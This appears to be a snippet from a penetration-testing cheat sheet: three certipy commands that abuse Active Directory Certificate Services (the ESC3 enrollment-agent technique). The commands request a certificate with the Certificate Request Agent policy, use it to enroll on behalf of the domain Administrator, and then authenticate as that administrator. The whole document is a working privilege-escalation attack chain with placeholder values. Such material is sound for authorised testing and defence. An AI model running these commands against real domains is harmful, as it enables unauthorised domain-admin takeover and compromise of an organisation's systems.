    ```bash
    # Request a certificate with "Certificate Request Agent" application policy
    certipy req -u $USER@$DOMAIN --application-policies "1.3.6.1.4.1.311.20.2.1" -ca $CA_NAME -template $TEMPLATE -dc-ip $DC_IP

    # Use the certificate in a ESC3 scenario to ask for a new certificate on behalf of another user
    certipy req -u $USER@$DOMAIN -on-behalf-of $DOMAIN\\Administrator -template User -ca $CA_NAME -pfx cert.pfx -dc-ip $DC_IP

    # Authenticate with the last certificate
    certipy auth -pfx administrator.pfx -dc-ip $DC_ADDR
    ```